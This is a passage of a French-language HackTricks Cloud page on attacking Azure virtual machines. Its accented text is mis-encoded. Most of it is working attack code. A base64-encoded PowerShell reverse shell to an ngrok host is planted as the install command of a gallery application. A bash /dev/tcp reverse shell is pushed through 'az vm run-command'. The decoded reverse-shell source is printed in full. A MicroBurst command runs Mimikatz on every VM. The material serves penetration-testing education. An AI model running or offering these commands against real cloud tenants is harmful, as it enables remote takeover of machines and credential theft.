export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
az sig gallery-application version create \
--version-name 1.0.0 \
--application-name myReverseShellAppWin \
--gallery-name myGallery \
--location "West US 2" \
--resource-group <rsc-group> \
--package-file-link "https://testing13242erih.blob.core.windows.net/testing-container/asd.txt?sp=r&st=2024-12-04T01:10:42Z&se=2024-12-04T09:10:42Z&spr=https&sv=2022-11-02&sr=b&sig=eMQFqvCj4XLLPdHvnyqgF%2B1xqdzN8m7oVtyOOkMsCEY%3D" \
--install-command "powershell.exe -EncodedCommand $encodedCommand" \
--remove-command "powershell.exe -EncodedCommand $encodedCommand" \
--update-command "powershell.exe -EncodedCommand $encodedCommand"

# Install the app in a VM to execute the rev shell
## Use the ID given in the previous output
az vm application set \
--resource-group <rsc-group> \
--name deleteme-win4 \
--app-version-ids /subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/resourceGroups/Resource_Group_1/providers/Microsoft.Compute/galleries/myGallery/applications/myReverseShellAppWin/versions/1.0.0 \
--treat-deployment-as-failure true
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Donn√©es utilisateur

C'est **des donn√©es persistantes** qui peuvent √™tre r√©cup√©r√©es √† partir du point de terminaison des m√©tadonn√©es √† tout moment. Notez qu'Azure les donn√©es utilisateur sont diff√©rentes de celles d'AWS et de GCP car **si vous placez un script ici, il n'est pas ex√©cut√© par d√©faut**.

### Donn√©es personnalis√©es

Il est possible de passer certaines donn√©es √† la VM qui seront stock√©es dans des chemins attendus :

* Dans **Windows**, les donn√©es personnalis√©es sont plac√©es dans `%SYSTEMDRIVE%\AzureData\CustomData.bin` en tant que fichier binaire et ne sont pas trait√©es.
* Dans **Linux**, elles √©taient stock√©es dans `/var/lib/waagent/ovf-env.xml` et maintenant elles sont stock√©es dans `/var/lib/waagent/CustomData/ovf-env.xml`
* **Agent Linux** : Il ne traite pas les donn√©es personnalis√©es par d√©faut, une image personnalis√©e avec les donn√©es activ√©es est n√©cessaire
* **cloud-init :** Par d√©faut, il traite les donn√©es personnalis√©es et ces donn√©es peuvent √™tre dans [**plusieurs formats**](https://cloudinit.readthedocs.io/en/latest/explanation/format.html). Il pourrait ex√©cuter un script facilement en envoyant simplement le script dans les donn√©es personnalis√©es.
* J'ai essay√© que les deux Ubuntu et Debian ex√©cutent le script que vous mettez ici.
* Il n'est √©galement pas n√©cessaire d'activer les donn√©es utilisateur pour que cela soit ex√©cut√©.
```bash
#!/bin/sh
echo "Hello World" > /var/tmp/output.txt
```
### **Ex√©cuter une commande**

C'est le m√©canisme le plus basique qu'Azure fournit pour **ex√©cuter des commandes arbitraires dans des VMs**. La permission n√©cessaire est `Microsoft.Compute/virtualMachines/runCommand/action`.

{% tabs %}
{% tab title="Linux" %}
```bash
# Execute rev shell
az vm run-command invoke \
--resource-group <rsc-group> \
--name <vm-name> \
--command-id RunShellScript \
--scripts @revshell.sh

# revshell.sh file content
echo "bash -c 'bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/19159 0>&1'" > revshell.sh
```
{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```bash
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
# Execute a rev shell
az vm run-command invoke \
--resource-group Research \
--name juastavm \
--command-id RunPowerShellScript \
--scripts @revshell.ps1

## Get encoded reverse shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("7.tcp.eu.ngrok.io",19159);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64

## Create app version with the rev shell
## In Package file link just add any link to a blobl storage file
export encodedCommand="JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANwAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADkAMQA1ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

# The content of
echo "powershell.exe -EncodedCommand $encodedCommand" > revshell.ps1


# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Escalade de Privil√®ges

{% content-ref url="../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md" %}
[az-virtual-machines-and-network-privesc.md](../../az-privilege-escalation/az-virtual-machines-and-network-privesc.md)
{% endcontent-ref %}

## Acc√®s Non Authentifi√©

{% content-ref url="../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md" %}
[az-vms-unath.md](../../az-unauthenticated-enum-and-initial-entry/az-vms-unath.md)
{% endcontent-ref %}

## Post Exploitation

{% content-ref url="../../az-post-exploitation/az-vms-and-network-post-exploitation.md" %}
[az-vms-and-network-post-exploitation.md](../../az-post-exploitation/az-vms-and-network-post-exploitation.md)
{% endcontent-ref %}

## Persistance

{% content-ref url="../../az-persistence/az-vms-persistence.md" %}
[az-vms-persistence.md](../../az-persistence/az-vms-persistence.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)
* [https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Formation AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Formation GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
